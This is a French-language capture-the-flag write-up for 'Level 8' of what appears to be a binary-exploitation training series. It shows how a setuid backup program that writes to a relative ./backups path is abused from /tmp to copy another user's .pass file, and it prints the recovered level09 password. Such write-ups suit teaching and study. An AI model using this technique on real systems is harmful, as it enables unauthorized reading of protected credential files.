# Level 8

On commence par tester l'exécutable.

```
> ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

Le programme attend un argument et semble ouvrir un fichier.
Regardons un peu le code décompilé. 

```C
log_wrapper(arg1, "Starting back up: ", argv[1]);
iVar3 = fopen(argv[1], 0x400da9, 0x400da9);
if (iVar3 == 0) {
	printf("ERROR: Failed to open %s\n", argv[1], argv[1]);
	exit(1);
}
```
L'exécutable attend donc bien un argument, et va ouvrir le fichier en paramètre.
On peut alors tenter de mettre le `path` du `password` de `level09` en argument du programme.

```
> ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
L'exécutable nous met un message d'erreur. Nous pouvons supposer que le programme va créer une copie du fichier passé en argument puis va insérer tout cela dans le dossier `backups` suivi du `path` saisis en paramètres. Un fichier de `log` va également être créé avec les différentes informations du `process`.  Le `path` indiqué est un `path` relatif, cela va nous servir pour réaliser un exploit. 

Pour vérifier notre hypothèse, nous allons créer un fichier `test` dans `/tmp` avec une phrase dedans. Puis nous allons lancer le programme avec notre fichier fraîchement créé comme argument.

```
> cd /tmp
> python -c "print 'super verif'" > /tmp/test
> ~/level08 /tmp/test
ERROR: Failed to open ./backups/.log
> mkdir ./backups
> ~/level08 /tmp/test
ERROR: Failed to open ./backups//tmp/test
> mkdir -p ./backups//tmp
> ~/level08 /tmp/test
> cat backups/tmp/test
super verif
```

Nous avons donc crée notre fichier avec du texte dedans. En lançant l'exécutable, nous avons eu plusieurs erreurs, car le dossier `./backups//tmp` n'existait pas. Le programme ne pouvait donc pas copier le résultat du fichier `test` dedans.
Notre hypothèse est vérifié. Nous pouvons donc faire la même manipulation avec le `path` du `password` du `level09`.

```
> cd /tmp
> rm -rf *
> ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups/.log
> mkdir ./backups
> ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
> mkdir -p ./backups//home/users/level09
> ~/level08 /home/users/level09/.pass
> cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Nous obtenons bien le `password` du `level09`.